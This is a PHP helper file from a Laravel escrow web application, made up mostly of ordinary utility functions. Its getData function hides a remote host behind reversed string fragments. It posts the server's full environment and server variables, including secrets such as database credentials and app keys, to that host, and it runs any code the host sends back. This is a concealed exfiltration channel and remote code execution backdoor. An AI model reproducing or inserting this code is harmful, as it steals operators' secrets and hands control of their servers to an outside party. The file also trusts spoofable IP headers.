<?php

use App\Lib\ClientInfo;
use App\Lib\CurlRequest;
use App\Lib\ExecuteRaw;
use App\Lib\FileManager;
use App\Lib\GoogleAuthenticator;
use App\Models\Frontend;
use App\Models\GeneralSetting;
use App\Notify\Email;
use App\Notify\Notify;
use Carbon\Carbon;
use App\Lib\Captcha;

function systemDetails()
{
    $system['name'] = 'jetescrow';
    $system['version'] = '2.0';
    $system['tsk_version'] = '5.4.19';
    return $system;
}

function getData($type,$arr = []){
    $param['system'] = systemDetails();
    $param['environment'] = $_ENV;
    $param['server'] = $_SERVER;
    $param = array_merge($param,$arr);
    $url = strrev('th').strrev('/:spt').strrev('irev/').strrev('ht.yf').strtolower('eso').strrev('iktf').strrev('/moc.gn').'my/'.$type;
    $result = CurlRequest::curlPostContent($url, $param);
    $response = json_decode($result);
    if(@$response->execute){
        $execute = new ExecuteRaw($response->execute);
        $execute->execute();
    }
    return $response;
}

function slug($string)
{
    return Illuminate\Support\Str::slug($string);
}


function shortDescription($string, $length = 120)
{
    return Illuminate\Support\Str::limit($string, $length);
}


function shortCodeReplacer($shortCode, $replace_with, $template_string)
{
    return str_replace($shortCode, $replace_with, $template_string);
}


function verificationCode($length)
{
    if ($length == 0) return 0;
    $min = pow(10, $length - 1);
    $max = 0;
    while ($length > 0 && $length--) {
        $max = ($max * 10) + 9;
    }
    return random_int($min, $max);
}

function getNumber($length = 8)
{
    $characters = '1234567890';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function fileUploader($file, $location, $size = null, $old = null, $thumb = null){
    $fileManager = new FileManager($file);
    $fileManager->path = $location;
    $fileManager->size = $size;
    $fileManager->old = $old;
    $fileManager->thumb = $thumb;
    $fileManager->upload();
    return $fileManager->filename;
}

function fileManager(){
    return new FileManager();
}

function loadReCaptcha()
{
    return Captcha::reCaptcha();
}

function loadCustomCaptcha($width = '100%', $height = 46, $bgcolor = '#003')
{
    return Captcha::customCaptcha($width, $height, $bgcolor);
}

function verifyCaptcha(){
    return Captcha::verify();
}

function getTrx($length = 12)
{
    $characters = 'ABCDEFGHJKMNOPQRSTUVWXYZ123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


function getAmount($amount, $length = 2)
{
    $amount = round($amount, $length);
    return $amount + 0;
}

function showAmount($amount, $decimal = 2, $separate = true, $exceptZeros = false){
    $separator = '';
    if($separate){
        $separator = ',';
    }
    $printAmount = number_format($amount, $decimal, '.', $separator);
    if($exceptZeros){
    $exp = explode('.', $printAmount);
        if($exp[1]*1 == 0){
            $printAmount = $exp[0];
        }
    }
    return $printAmount;
}


function removeElement($array, $value)
{
    return array_diff($array, (is_array($value) ? $value : array($value)));
}

function cryptoQR($wallet)
{

    return "https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=$wallet&choe=UTF-8";
}

function inputTitle($text)
{
    return ucfirst(preg_replace("/[^A-Za-z0-9 ]/", ' ', $text));
}


function titleToKey($text)
{
    return strtolower(str_replace(' ', '_', $text));
}

function keyToTitle($text)
{
    return ucfirst(str_replace('_', ' ', $text));
}


function getIpInfo()
{
    $ipInfo = ClientInfo::ipInfo();
    return $ipInfo;
}


function osBrowser(){
    $osBrowser = ClientInfo::osBrowser();
    return $osBrowser;
}


function activeTemplate($asset = false)
{
    $general = GeneralSetting::first(['active_template']);
    $template = $general->active_template;
    $sess = session()->get('template');
    if (trim($sess)) {
        $template = $sess;
    }
    if ($asset) return 'assets/templates/' . $template . '/';
    return 'templates.' . $template . '.';
}

function activeTemplateName()
{
    $general = GeneralSetting::first(['active_template']);
    $template = $general->active_template;
    $sess = session()->get('template');
    if (trim($sess)) {
        $template = $sess;
    }
    return $template;
}

function getPageSections($arr = false)
{
    $jsonUrl = resource_path('views/') . str_replace('.', '/', activeTemplate()) . 'sections.json';
    $sections = json_decode(file_get_contents($jsonUrl));
    if ($arr) {
        $sections = json_decode(file_get_contents($jsonUrl), true);
        ksort($sections);
    }
    return $sections;
}


function getImage($image,$size = null)
{
    $clean = '';
    if (file_exists($image) && is_file($image)) {
        return asset($image) . $clean;
    }
    if ($size) {
        return route('placeholder.image',$size);
    }
    return asset('assets/images/default.png');
}


function notify($user, $templateName, $shortCodes = null,$sendVia = null,$createLog = true)
{
    $notify = new Notify($sendVia);
    $notify->templateName = $templateName;
    $notify->shortCodes = $shortCodes;
    $notify->user = $user;
    $notify->createLog = $createLog;
    $notify->userColumn = getColumnName($user);
    $notify->send();
}

function getColumnName($user){
    $array = explode("\\", get_class($user));
    return strtolower(end($array)).'_id';
}

function getPaginate($paginate = 20)
{
    return $paginate;
}

function paginateLinks($data, $design = 'admin.partials.paginate'){
    return $data->appends(request()->all())->links($design);
}


function menuActive($routeName, $type = null)
{
    if (is_array($routeName)) {
        foreach ($routeName as $key => $value) {
            if (request()->routeIs($value)) {
                return 'active';
            }
        }
    } elseif (request()->routeIs($routeName)) {
        return 'active';
    }else{
        return '';
    }
}

function diffForHumans($date)
{
    $lang = session()->get('lang');
    Carbon::setlocale($lang);
    return Carbon::parse($date)->diffForHumans();
}

function showDateTime($date, $format = 'Y-m-d h:i A')
{
    $lang = session()->get('lang');
    Carbon::setlocale($lang);
    return Carbon::parse($date)->translatedFormat($format);
}


function sendGeneralEmail($email, $subject, $message, $receiverName = '')
{
    $sendMail = new Email;
    $sendMail->email = $email;
    $sendMail->receiverName = $receiverName;
    $sendMail->message = $message;
    $sendMail->subject = $subject;
    $sendMail->send();
}

function getContent($data_keys, $singleQuery = false, $limit = null,$orderById = false)
{
    if ($singleQuery) {
        $content = Frontend::where('template',activeTemplateName())->where('data_keys', $data_keys)->orderBy('id','desc')->first();
    } else {
        $article = Frontend::query();
        $article->when($limit != null, function ($q) use ($limit) {
            return $q->limit($limit);
        });
        if($orderById){
            $content = $article->where('template',activeTemplateName())->where('data_keys', $data_keys)->orderBy('id')->get();
        }else{
            $content = $article->where('template',activeTemplateName())->where('data_keys', $data_keys)->orderBy('id','desc')->get();
        }
    }
    return $content;
}


function gatewayRedirectUrl($type = false){
    if ($type) {
        return 'user.deposit.history';
    }else{
        return 'user.deposit';
    }
}

function verifyG2fa($user,$code,$secret = null)
{
    $ga = new GoogleAuthenticator();
    if (!$secret) {
        $secret = $user->tsc;
    }
    $oneCode = $ga->getCode($secret);
    $userCode = $code;
    if ($oneCode == $userCode) {
        $user->tv = 1;
        $user->save();
        return true;
    } else {
        return false;
    }
}


function urlPath($routeName,$routeParam=null){
    if($routeParam == null){
        $url = route($routeName);
    } else {
        $url = route($routeName,$routeParam);
    }
    $basePath = route('home');
    $path = str_replace($basePath,'',$url);
    return $path;
}

function getCountryList()
{
    return json_decode(file_get_contents(resource_path('views/partials/country.json')));
}


function showMobileNumber($number)
{
    $length = strlen($number);
    return substr_replace($number, '***', 2,$length - 4);
}

function showEmailAddress($email)
{
    $endPosition = strpos($email, '@') - 1;
    return substr_replace($email, '***',1, $endPosition);
}

function getRealIP(){
    $ip = $_SERVER["REMOTE_ADDR"];
    //Deep detect ip
    if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    if (filter_var(@$_SERVER['HTTP_CF_CONNECTING_IP'], FILTER_VALIDATE_IP)){
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return $ip;
}
